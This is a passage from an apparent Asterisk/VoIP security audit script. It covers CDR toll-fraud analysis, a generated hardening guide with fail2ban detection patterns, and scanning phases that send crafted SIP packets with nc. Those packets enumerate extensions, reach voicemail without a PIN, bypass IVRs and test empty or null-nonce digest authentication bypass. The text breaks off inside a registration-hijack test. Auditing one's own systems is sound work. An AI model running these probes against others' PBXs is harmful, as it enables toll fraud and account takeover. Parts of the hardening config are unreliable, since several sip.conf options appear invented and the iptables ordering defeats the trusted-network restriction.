        with open(CDR_FILE, 'r') as f:
            reader = csv.DictReader(f)
            
            for row in reader:
                try:
                    calldate = row.get('calldate', '')
                    dst = row.get('dst_number', '')
                    duration = int(row.get('duration_seconds', 0))
                    
                    if not dst or not calldate:
                        continue
                    
                    country_code = extract_country_code(dst)
                    if not country_code:
                        continue
                    
                    day = calldate.split()[0]
                    stats = country_stats[country_code][day]
                    
                    stats['calls'] += 1
                    stats['duration'] += duration
                    stats['destinations'].add(dst)
                    
                except (ValueError, KeyError) as e:
                    continue
    
    except FileNotFoundError:
        print(f"Error: CDR file not found: {CDR_FILE}", file=sys.stderr)
        return
    
    # Flag suspicious activity
    with open(FRAUD_REPORT, 'w') as report:
        report.write("╔════════════════════════════════════════════════════════════════════╗\n")
        report.write("║             CDR FRAUD ANALYSIS & ANOMALY DETECTION REPORT           ║\n")
        report.write("║             Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "                ║\n")
        report.write("╚════════════════════════════════════════════════════════════════════╝\n\n")
        
        report.write(f"Approved Country Codes: {', '.join(APPROVED_CODES)}\n")
        report.write(f"Volume Threshold: {VOLUME_THRESHOLD} calls/day\n")
        report.write(f"Duration Threshold: {DURATION_THRESHOLD} minutes/day\n\n")
        
        report.write("═" * 70 + "\n")
        report.write("FLAGGED HIGH-RISK DESTINATIONS\n")
        report.write("═" * 70 + "\n\n")
        
        flagged_records = []
        
        for country_code, days in country_stats.items():
            if country_code in APPROVED_CODES:
                continue
            
            for day, stats in days.items():
                if stats['calls'] >= VOLUME_THRESHOLD or stats['duration'] >= DURATION_THRESHOLD:
                    flagged_records.append({
                        'country_code': country_code,
                        'day': day,
                        'calls': stats['calls'],
                        'duration': stats['duration'],
                        'unique_dests': len(stats['destinations']),
                        'risk_score': (stats['calls'] / VOLUME_THRESHOLD) + (stats['duration'] / DURATION_THRESHOLD)
                    })
        
        # Sort by duration descending
        flagged_records.sort(key=lambda x: x['duration'], reverse=True)
        
        # Format as table
        report.write(f"{'Country Code':<15} {'Date':<15} {'Calls':<10} {'Duration (min)':<20} {'Risk':<10}\n")
        report.write("─" * 70 + "\n")
        
        for record in flagged_records:
            risk_level = "🔴 CRITICAL" if record['risk_score'] > 2 else "🟠 HIGH"
            report.write(f"{record['country_code']:<15} {record['day']:<15} {record['calls']:<10} "
                        f"{record['duration']:<20} {risk_level:<10}\n")
        
        report.write("\n" + "═" * 70 + "\n")
        report.write(f"Total Flagged Records: {len(flagged_records)}\n")
        report.write(f"Estimated Fraud Loss: ${sum(r['duration'] * 0.15 for r in flagged_records):.2f}\n")
        report.write("═" * 70 + "\n")

if __name__ == "__main__":
    analyze_cdr_data()
PYEOF

    python3 "$python_script" "$CDR_FILE"
}

phase4_bash_analysis() {
    log_info "Using Bash for CDR analysis (limited features)"
    
    {
        echo "╔════════════════════════════════════════════════════════════════════╗"
        echo "║             CDR FRAUD ANALYSIS & ANOMALY DETECTION REPORT           ║"
        echo "║             Generated: $(date '+%Y-%m-%d %H:%M:%S')                ║"
        echo "╚════════════════════════════════════════════════════════════════════╝"
        echo ""
        echo "Approved Country Codes: $(IFS=, ; echo "${APPROVED_COUNTRY_CODES[*]}")"
        echo ""
        echo "═════════════════════════════════════════════════════════════════════"
        echo "TOP INTERNATIONAL DESTINATIONS BY CALL VOLUME"
        echo "═════════════════════════════════════════════════════════════════════"
        echo ""
        
        # Extract and analyze top destinations
        tail -n +2 "$CDR_FILE" 2>/dev/null | \
        awk -F',' '{print $3}' | \
        grep -E "^\+|^011" | \
        sort | uniq -c | sort -rn | head -20 | \
        awk '{printf "%-5d calls to destination %s\n", $1, $2}'
        
        echo ""
        echo "═════════════════════════════════════════════════════════════════════"
        
    } > "$FRAUD_REPORT"
}

# ============================================================================
# PHASE 5: CONFIGURATION HARDENING & RECOMMENDATIONS
# ============================================================================

phase5_hardening_configuration() {
    log_banner "PHASE 5: CONFIGURATION HARDENING & RECOMMENDATIONS"
    
    {
        echo "╔════════════════════════════════════════════════════════════════════╗"
        echo "║        ENTERPRISE VOIP SECURITY HARDENING CONFIGURATION             ║"
        echo "║        Generated: $(date '+%Y-%m-%d %H:%M:%S')                     ║"
        echo "╚════════════════════════════════════════════════════════════════════╝"
        echo ""
        
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "COMPONENT 1: ASTERISK DIALPLAN SECURITY (extensions.conf)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        
        cat << 'DIALPLAN'

; ========================================
; SECURE INTERNATIONAL CALL ROUTING
; ========================================

[international-blocked]
; Block all international calls by default
exten => _9!,1,Verbose(1,Attempted international call to ${EXTEN:1})
same => n,Log(WARNING,Unauthorized international call attempt: ${EXTEN:1} from ${CALLERID(num)})
same => n,Playback(privacy-incorrect)
same => n,Hangup()

[international-approved]
; Approved international routing with authentication
exten => 90[1-9].,1,Verbose(1,Processing approved international call to ${EXTEN:2})
same => n,Set(COUNTRY_CODE=${EXTEN:2:2})
same => n,GotoIf($["${COUNTRY_CODE}" = "1"]?us_routing)
same => n,GotoIf($["${COUNTRY_CODE}" = "44"]?uk_routing)
same => n,GotoIf($["${COUNTRY_CODE}" = "61"]?au_routing)
same => n,Playback(privacy-incorrect)
same => n,Hangup()

exten => us_routing,1,Verbose(1,Routing to US +1)
same => n,Dial(SIP/provider_usa/${EXTEN:2})
same => n,Hangup()

exten => uk_routing,1,Verbose(1,Routing to UK +44)
same => n,Dial(SIP/provider_uk/${EXTEN:2})
same => n,Hangup()

exten => au_routing,1,Verbose(1,Routing to Australia +61)
same => n,Dial(SIP/provider_au/${EXTEN:2})
same => n,Hangup()

[main-security]
; Main context with security controls
exten => _X.,1,Log(NOTICE,Incoming call from ${CALLERID(num)} to ${EXTEN})

; Rate limiting - max 5 calls per minute per extension
exten => _X.,n,Set(CALL_COUNT=${GLOBAL(call_count_${CALLERID(num)}):-0})
exten => _X.,n,Set(LAST_CALL_TIME=${GLOBAL(last_call_time_${CALLERID(num)}):-0})
exten => _X.,n,Set(CURRENT_TIME=${EPOCH})
exten => _X.,n,GotoIf($[$[${CURRENT_TIME} - ${LAST_CALL_TIME}] > 60]?reset_counter)
exten => _X.,n,GotoIf($[${CALL_COUNT} > 5]?rate_limit_exceeded)
exten => _X.,n,Set(GLOBAL(call_count_${CALLERID(num)})=$[${CALL_COUNT} + 1])
exten => _X.,n,Goto(process_call)

exten => reset_counter,1,Set(GLOBAL(call_count_${CALLERID(num)})=1)
exten => reset_counter,n,Goto(process_call)

exten => rate_limit_exceeded,1,Log(WARNING,Rate limit exceeded for ${CALLERID(num)})
exten => rate_limit_exceeded,n,Playback(privacy-incorrect)
exten => rate_limit_exceeded,n,Hangup()

exten => process_call,1,Set(GLOBAL(last_call_time_${CALLERID(num)})=${EPOCH})

; Reject international 011 prefix calls
exten => _011X.,1,Log(WARNING,Blocked international call: 011${EXTEN:3} from ${CALLERID(num)})
exten => _011X.,n,Playback(privacy-incorrect)
exten => _011X.,n,Hangup()

; Route local calls
exten => _9XXXXX,1,Dial(SIP/provider/${EXTEN:1})
exten => _9XXXXX,n,Hangup()

DIALPLAN

        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "COMPONENT 2: FAIL2BAN SIP BRUTE-FORCE PROTECTION"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        
        cat << 'FAIL2BAN'

[INCLUDES]
before = common.conf

[Definition]
# SIP brute-force patterns
_daemon = asterisk|SIP
failregex = ^.*SIP/2\.0.*401 Unauthorized.*<HOST>.*$
            ^.*SIP/2\.0.*403 Forbidden.*<HOST>.*$
            ^.*SIP Registration request.*from unknown host <HOST>.*$
            ^.*Call from <HOST>.*exceeds max calls limit.*$
            ^.*<HOST>.*SIP OPTIONS scan detected.*$
            ^.*Aggressive SIP scanning from <HOST>.*$
            ^.*Failed SIP authentication attempt from <HOST>.*$
            ^.*Denied SIP INVITE from <HOST>.*$

ignoreregex = ^.*from internal network.*$

datepattern = %%ExY-%%m-%%d %%H:%%M:%%S
              ^.{19}

[Init]
journalmatch = _SYSTEMD_UNIT=asterisk.service

FAIL2BAN

        echo ""
        cat << 'FAIL2BAN_JAIL'

# /etc/fail2ban/jail.d/asterisk-sip.conf

[asterisk-sip]
enabled = true
port = 5060,5061,5062
filter = asterisk
logpath = /var/log/asterisk/messages
maxretry = 3
findtime = 300
bantime = 3600
action = iptables-multiport[name=asterisk-sip, port="5060,5061,5062", protocol=udp]
         sendmail-whois[name=Asterisk, dest=admin@example.com]

[asterisk-sip-aggressive]
enabled = true
port = 5060,5061
filter = asterisk
logpath = /var/log/asterisk/messages
maxretry = 1
findtime = 60
bantime = 7200
action = iptables-multiport[name=asterisk-aggressive, port="5060,5061", protocol=udp]

FAIL2BAN_JAIL

        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "COMPONENT 3: SIP OPTIONS HEADER SUPPRESSION (sip.conf)"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        
        cat << 'SIPCONF'

; /etc/asterisk/sip.conf - Security Hardening

[general]
; Disable version information disclosure
sipdebug = no
videosupport = no
faxdetect = no

; Suppress Server header in SIP responses
sendrpid = no
rpid_update = no

; Disable SIP OPTIONS response
sip_options_response = no

; Disable version info in User-Agent
useragent = Asterisk

; Strict SIP protocol enforcement
tos_sip = cs3
tos_audio = ef
tos_video = af41
cos_sip = 3
cos_audio = 6
cos_video = 4

; Disable unnecessary headers
disallow_globals_in_config = yes

; Authenticate all SIP requests
authenticate_invite = yes
authenticated_request = yes

; Require auth on registration
requirecalltoken = yes

; Disable direct media without authentication
directmedia = no

; Encryption settings
tlsenable = yes
tlsbindaddr = 0.0.0.0:5061
tlscertfile = /etc/asterisk/keys/asterisk.crt
tlsprivatekey = /etc/asterisk/keys/asterisk.key
tlscipher = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256

; Disable insecure methods
allowoverlap = no
allowsubscribe = no
allowtransfer = no

; SIP registration timeout (prevent account enumeration)
minexpiry = 60
maxexpiry = 300
defaultexpiry = 120

; Do not send detailed error responses
sip_verbose_debuginfo = no

[authentication]
; Enforce strong authentication
auth_method = userpass
auth_timeout = 30

SIPCONF

        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "COMPONENT 4: IPTABLES FIREWALL RULES"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        
        cat << 'IPTABLES'

#!/bin/bash
# VoIP Security Firewall Configuration

# Clear existing rules
iptables -F
iptables -X
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Rate limiting for SIP
iptables -A INPUT -p udp --dport 5060 -m limit --limit 50/second --limit-burst 100 -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -j DROP

iptables -A INPUT -p tcp --dport 5061 -m limit --limit 50/second --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --dport 5061 -j DROP

# RTP port range protection
iptables -A INPUT -p udp --dport 16384:32767 -m state --state NEW,ESTABLISHED -j ACCEPT

# Only allow SIP from trusted networks
iptables -A INPUT -p udp -s 192.168.1.0/24 --dport 5060 -j ACCEPT
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 5061 -j ACCEPT

# Drop SIP packets with suspicious flags
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE" --algo bm -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -m string --string "OPTIONS" --algo bm -m limit --limit 10/second -j ACCEPT

# Protect against SIP scanning
iptables -A INPUT -p udp --dport 5060 -m recent --set --name sip
iptables -A INPUT -p udp --dport 5060 -m recent --name sip --update --seconds 10 --hitcount 100 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4

IPTABLES

        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "COMPONENT 5: RECOMMENDED SECURITY MEASURES"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "1. ENABLE TRANSPORT LAYER SECURITY (TLS)"
        echo "   - Enforce TLS for all SIP signaling"
        echo "   - Use strong certificates (RSA 2048-bit minimum)"
        echo "   - Implement certificate pinning"
        echo ""
        
        echo "2. IMPLEMENT SRTP FOR MEDIA ENCRYPTION"
        echo "   - Mandatory SRTP for all media streams"
        echo "   - Negotiate encryption parameters securely"
        echo "   - Use strong cipher suites (AES-256-GCM)"
        echo ""
        
        echo "3. DISABLE DANGEROUS SIP METHODS"
        echo "   - BYE, CANCEL, PRACK when not needed"
        echo "   - SUBSCRIBE, NOTIFY (reduce attack surface)"
        echo "   - INFO, UPDATE (for limited use cases only)"
        echo ""
        
        echo "4. IMPLEMENT DDoS MITIGATION"
        echo "   - IP reputation filtering"
        echo "   - Connection rate limiting"
        echo "   - Geographic filtering"
        echo "   - Anycast network distribution"
        echo ""
        
        echo "5. ENABLE COMPREHENSIVE LOGGING & MONITORING"
        echo "   - Log all authentication attempts"
        echo "   - Monitor for anomalous patterns"
        echo "   - Real-time alerts for suspicious activity"
        echo "   - Centralized log aggregation (ELK, Splunk)"
        echo ""
        
        echo "6. IMPLEMENT VPN/IPSEC FOR TRUNK CONNECTIONS"
        echo "   - Require IPSec for provider trunks"
        echo "   - Use IKEv2 with strong algorithms"
        echo "   - Perfect forward secrecy (PFS)"
        echo ""
        
        echo "7. REGULAR SECURITY UPDATES"
        echo "   - Subscribe to Asterisk security advisories"
        echo "   - Test patches in staging environment first"
        echo "   - Implement automated patch management"
        echo ""
        
        echo "8. NETWORK SEGMENTATION"
        echo "   - Isolate VoIP network from data network"
        echo "   - Use dedicated VLAN for SIP signaling"
        echo "   - Separate RTP media path"
        echo ""
        
    } > "$HARDENING_CONFIG"
    
    log_success "Hardening configuration generated"
}

# ============================================================================
# PHASE 7: SIP ENUMERATION & METHOD FUZZING (v3.0)
# ============================================================================
# Tests all major SIP methods per RFC 3261 §5 to map the attack surface,
# detect version disclosure, and identify unauthenticated method exposure.
# ============================================================================

phase7_sip_enumeration() {
    log_banner "PHASE 7: SIP ENUMERATION & METHOD FUZZING"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 7 - no live hosts"; return 0; }
    
    while IFS= read -r ip; do
        {
            test_sip_methods "$ip"
            test_sip_version_disclosure "$ip"
            test_unauthenticated_subscribe "$ip"
        } &
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_success "Phase 7 Complete"
}

# Probe all standard SIP methods (RFC 3261 §5 + extensions).
# Response code differentiation reveals user existence:
#   401 = user exists but needs auth, 403 = forbidden, 404 = not found
test_sip_methods() {
    local ip="$1"
    # All methods defined in RFC 3261 plus common extensions (RFC 3265, 3903)
    local methods=("OPTIONS" "REGISTER" "INVITE" "SUBSCRIBE" "NOTIFY"
                   "PUBLISH" "INFO" "UPDATE" "REFER" "MESSAGE")
    
    for method in "${methods[@]}"; do
        local response
        response=$(timeout 3 bash -c "
            printf '${method} sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-${method,,}\r\nTo: <sip:${ip}>\r\nFrom: <sip:scanner@scanner>;tag=fuzz\r\nCall-ID: fuzz-${method,,}@scanner\r\nCSeq: 1 ${method}\r\nContent-Length: 0\r\n\r\n'
            sleep 1
        " | nc -w 2 "$ip" 5060 2>/dev/null) \
            || log_debug "SIP $method probe failed for $ip"
        
        # Log unexpected 200 OK on SUBSCRIBE/NOTIFY (RFC 3265 - may indicate presence abuse)
        if [[ "$method" == "SUBSCRIBE" || "$method" == "NOTIFY" ]]; then
            if echo "$response" | grep -q "200 OK"; then
                append_cve_finding "$ip" "MISCONFIGURATION" "Unauthenticated SIP $method Accepted" \
                    "MEDIUM" "Server responds 200 OK to unauthenticated $method - potential presence information abuse (RFC 3265)" \
                    "sip://$ip:5060"
            fi
        fi
        
        # Version disclosure via Server or User-Agent header (RFC 3261 §20.35/20.41)
        local server_hdr
        server_hdr=$(echo "$response" | grep -iE "^(Server|User-Agent):" | head -1)
        if [[ -n "$server_hdr" ]]; then
            log_info "[$ip] SIP $method response header: $server_hdr"
        fi
    done
}

# Detect SIP server version disclosure via Server/User-Agent response headers.
# Attackers use version info to select targeted exploits.
test_sip_version_disclosure() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
        printf 'OPTIONS sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-ver\r\nTo: <sip:${ip}>\r\nFrom: <sip:scanner@scanner>;tag=ver\r\nCall-ID: ver@scanner\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    local server
    server=$(echo "$response" | grep -iE "^(Server|User-Agent):" | head -1)
    
    if [[ -n "$server" ]]; then
        append_cve_finding "$ip" "INFO-DISCLOSURE" "SIP Server Version Disclosure" \
            "LOW" "Server reveals software identity: $server - suppress with 'useragent=<generic>' in sip.conf" \
            "sip://$ip:5060"
    fi
}

# Test unauthenticated SUBSCRIBE (RFC 3265 presence abuse).
# Precondition: server must have allowsubscribe=yes and no auth required.
test_unauthenticated_subscribe() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
        printf 'SUBSCRIBE sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-sub\r\nTo: <sip:${ip}>\r\nFrom: <sip:scanner@scanner>;tag=sub\r\nCall-ID: sub@scanner\r\nCSeq: 1 SUBSCRIBE\r\nEvent: presence\r\nExpires: 60\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response" | grep -q "200 OK"; then
        append_cve_finding "$ip" "MISCONFIGURATION" "Unauthenticated SUBSCRIBE Presence Accepted" \
            "MEDIUM" "Server allows unauthenticated SIP SUBSCRIBE - presence data may be harvested without credentials" \
            "sip://$ip:5060"
    fi
}

# ============================================================================
# PHASE 8: EXTENSION SCANNING & USER ENUMERATION (v3.0)
# ============================================================================
# Probes common extensions to enumerate valid users via response code
# differentiation (401 vs 403 vs 404). Results written atomically using
# process-specific temp files merged at phase end (avoids race conditions).
# ============================================================================

phase8_extension_scanning() {
    log_banner "PHASE 8: EXTENSION SCANNING & USER ENUMERATION"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 8 - no live hosts"; return 0; }
    
    # Initialize output file
    > "$VALID_EXTENSIONS_FILE"
    
    while IFS= read -r ip; do
        {
            scan_extensions "$ip"
            test_voicemail_no_pin "$ip"
            test_ivr_bypass "$ip"
        } &
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    local ext_count
    ext_count=$(wc -l < "$VALID_EXTENSIONS_FILE" 2>/dev/null || echo "0")
    log_success "Phase 8 Complete - $ext_count valid extensions discovered"
}

# Enumerate extensions via REGISTER response code differentiation.
# RFC 3261 §8.1.3 - 401 means user exists (challenge issued), 404 means not found.
# Uses process-specific temp file ($$) then appends to avoid concurrent write races.
scan_extensions() {
    local ip="$1"
    local common_exts=(
        100 101 102 103 104 105 106 107 108 109 110
        200 201 202 203 204 205
        300 301 400 401 500 501 600 601 700 701
        1000 1001 2000 2001 9000 9001 9999
        operator admin guest reception voicemail fax ivr
    )
    local proc_tmp="${VALID_EXTENSIONS_FILE}.${$}"
    
    for ext in "${common_exts[@]}"; do
        local response
        response=$(timeout 3 bash -c "
            printf 'REGISTER sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-ext${ext}\r\nTo: <sip:${ext}@${ip}>\r\nFrom: <sip:${ext}@${ip}>;tag=scan\r\nCall-ID: ext-${ext}@scanner\r\nCSeq: 1 REGISTER\r\nContact: <sip:${ext}@scanner>\r\nExpires: 60\r\nContent-Length: 0\r\n\r\n'
            sleep 1
        " | nc -w 2 "$ip" 5060 2>/dev/null) || continue
        
        # 401 Unauthorized = user exists and auth is required (good: auth enforced)
        # 200 OK = user exists with NO auth (bad: unauthenticated registration)
        if echo "$response" | grep -qE "^SIP/2\.0 (401|200)"; then
            echo "$ip:$ext" >> "$proc_tmp"
            log_info "[$ip] Extension $ext appears valid ($(echo "$response" | grep -oE 'SIP/2\.0 [0-9]+' | head -1))"
        fi
    done
    
    # Atomic append from per-process file to shared output
    if [[ -f "$proc_tmp" ]]; then
        cat "$proc_tmp" >> "$VALID_EXTENSIONS_FILE"
        rm -f "$proc_tmp"
    fi
}

# Test voicemail access without PIN (common misconfiguration).
# Prerequisite: voicemail system reachable at known extension (typically 8500 in Asterisk).
test_voicemail_no_pin() {
    local ip="$1"
    local vm_exts=("8500" "*97" "*98" "7777")
    
    for vext in "${vm_exts[@]}"; do
        local response
        response=$(timeout 3 bash -c "
            printf 'INVITE sip:${vext}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-vm\r\nTo: <sip:${vext}@${ip}>\r\nFrom: <sip:scanner@scanner>;tag=vm\r\nCall-ID: vm@scanner\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n'
            sleep 1
        " | nc -w 2 "$ip" 5060 2>/dev/null) || continue
        
        if echo "$response" | grep -q "200 OK"; then
            append_cve_finding "$ip" "MISCONFIGURATION" "Voicemail Accessible Without PIN" \
                "HIGH" "Voicemail extension $vext answered without authentication - set a PIN in voicemail.conf" \
                "sip://$ip:5060/ext=$vext"
        fi
    done
}

# Test IVR bypass via extension 0 (operator transfer abuse).
test_ivr_bypass() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
        printf 'INVITE sip:0@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-ivr\r\nTo: <sip:0@${ip}>\r\nFrom: <sip:scanner@scanner>;tag=ivr\r\nCall-ID: ivr@scanner\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response" | grep -q "200 OK"; then
        append_cve_finding "$ip" "MISCONFIGURATION" "IVR Bypass via Extension 0" \
            "MEDIUM" "Extension 0 (operator) responds without auth - may allow IVR bypass or free outbound calls" \
            "sip://$ip:5060/ext=0"
    fi
}

# ============================================================================
# PHASE 9: RTP/RTCP VULNERABILITY TESTING (v3.0)
# ============================================================================

phase9_rtp_rtcp_testing() {
    log_banner "PHASE 9: RTP/RTCP VULNERABILITY TESTING"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 9 - no live hosts"; return 0; }
    
    while IFS= read -r ip; do
        {
            test_rtcp_info_disclosure "$ip"
            test_rtp_port_exposure "$ip"
            test_srtp_enforcement "$ip"
        } &
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_success "Phase 9 Complete"
}

# RTCP (RFC 3550 §6) Receiver Report probe - may expose session statistics.
test_rtcp_info_disclosure() {
    local ip="$1"
    
    # Send a minimal RTCP Receiver Report (PT=201) to common RTCP ports
    local rtcp_ports=(5005 5007 5061 7001)
    for port in "${rtcp_ports[@]}"; do
        local response
        response=$(timeout 3 bash -c "printf '\x80\xc9\x00\x01\x00\x00\x00\x00'" \
            | nc -u -w 1 "$ip" "$port" 2>/dev/null) || continue
        if [[ -n "$response" ]]; then
            append_cve_finding "$ip" "INFO-DISCLOSURE" "RTCP Port Responding - Possible Session Leakage" \
                "LOW" "RTCP port $port is open and responding - may expose RTP session metadata (RFC 3550 §6)" \
                "udp://$ip:$port"
        fi
    done
}

# Scan for wide RTP port exposure in the standard media port range (RFC 3550 §11).
test_rtp_port_exposure() {
    local ip="$1"
    local sample_rtp_ports=(16384 16386 16388 20000 20002 32766 32767)
    local open_count=0
    
    for port in "${sample_rtp_ports[@]}"; do
        if timeout 1 bash -c "echo >/dev/udp/$ip/$port" 2>/dev/null; then
            ((open_count++)) || true
        fi
    done
    
    if (( open_count >= 3 )); then
        append_cve_finding "$ip" "EXPOSURE" "Wide RTP Port Range Exposed" \
            "MEDIUM" "$open_count sampled RTP ports reachable - restrict range to only required ports via iptables/rtp_port_range" \
            "udp://$ip:16384-32767"
    fi
}

# Check whether the server accepts unencrypted RTP in place of SRTP.
# RFC 3711 §3.1 - SRTP enforcement should be mandatory on hardened systems.
test_srtp_enforcement() {
    local ip="$1"
    
    # Offer plain RTP in SDP (no crypto lines) - a hardened server should reject with 488
    local sdp
    sdp=$(printf 'v=0\r\no=scanner 0 0 IN IP4 %s\r\ns=-\r\nc=IN IP4 %s\r\nt=0 0\r\nm=audio 16384 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000\r\n' "$ip" "$ip")
    local sdp_len=${#sdp}
    local response
    response=$(timeout 3 bash -c "
        printf 'INVITE sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-srtp\r\nTo: <sip:${ip}>\r\nFrom: <sip:scanner@scanner>;tag=srtp\r\nCall-ID: srtp@scanner\r\nCSeq: 1 INVITE\r\nContent-Type: application/sdp\r\nContent-Length: ${sdp_len}\r\n\r\n${sdp}'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response" | grep -q "200 OK"; then
        append_cve_finding "$ip" "MISCONFIGURATION" "Unencrypted RTP Accepted (SRTP Not Enforced)" \
            "HIGH" "Server negotiates plain RTP without encryption - enable 'encryption=yes' and reject non-SRTP offers (RFC 3711)" \
            "sip://$ip:5060"
    fi
}

# ============================================================================
# PHASE 10: CREDENTIAL HARVESTING & AUTH BYPASS (v3.0)
# ============================================================================

phase10_credential_harvesting() {
    log_banner "PHASE 10: CREDENTIAL HARVESTING & AUTH BYPASS"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 10 - no live hosts"; return 0; }
    
    while IFS= read -r ip; do
        test_sip_digest_bypass "$ip"
        test_registration_hijack "$ip"
        test_unauthenticated_refer "$ip"
        test_http_default_credentials_tls "$ip"
        test_asterisk_ami_credentials "$ip"
        test_md5_digest_weakness "$ip"
    done < "$LIVE_IPS_FILE"
    
    log_success "Phase 10 Complete"
}

# SIP Digest Authentication Bypass Tests (RFC 3261 §22.4).
# SECURITY TEST PREREQUISITES:
#   - Empty credentials bypass: only works if server validates presence of
#     Authorization header without checking the response hash (misconfiguration).
#   - Null nonce bypass: requires server to accept a nonce of "" which some
#     early Asterisk builds (pre-1.8.x) did under specific config.
# These tests are intentionally sending invalid auth to detect missing validation.
test_sip_digest_bypass() {
    local ip="$1"
    
    # Test 1: Empty credentials - sends Digest with empty response field.
    # A properly RFC-3261-compliant server MUST reject this with 401/403.
    local response_empty
    response_empty=$(timeout 3 bash -c "
        printf 'REGISTER sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-bypass\r\nTo: <sip:admin@${ip}>\r\nFrom: <sip:admin@${ip}>;tag=bypass\r\nCall-ID: bypass@scanner\r\nCSeq: 2 REGISTER\r\nAuthorization: Digest username=\"admin\", realm=\"${ip}\", nonce=\"test\", uri=\"sip:${ip}\", response=\"\"\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response_empty" | grep -q "200 OK"; then
        append_cve_finding "$ip" "AUTH-BYPASS" "SIP Digest Bypass: Empty Response Field Accepted" \
            "CRITICAL" "Server accepted REGISTER with empty Digest response= field - auth validation is broken (RFC 3261 §22.4)" \
            "sip://$ip:5060"
    fi
    
    # Test 2: Null nonce bypass - sends Digest with nonce="" (empty nonce value).
    # Only exploitable if the server omits nonce validation (very rare in modern builds).
    local response_null
    response_null=$(timeout 3 bash -c "
        printf 'REGISTER sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-nulln\r\nTo: <sip:admin@${ip}>\r\nFrom: <sip:admin@${ip}>;tag=nulln\r\nCall-ID: nulln@scanner\r\nCSeq: 3 REGISTER\r\nAuthorization: Digest username=\"admin\", realm=\"${ip}\", nonce=\"\", uri=\"sip:${ip}\", response=\"\"\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response_null" | grep -q "200 OK"; then
        append_cve_finding "$ip" "AUTH-BYPASS" "SIP Digest Bypass: Null Nonce Accepted" \
            "CRITICAL" "Server accepted REGISTER with empty nonce - nonce validation missing (affects pre-1.8 Asterisk)" \
            "sip://$ip:5060"
    fi
}

# Registration hijacking: re-register an existing AOR with a different Contact.
# Requires knowing a valid extension (e.g., from Phase 8 results).
test_registration_hijack() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
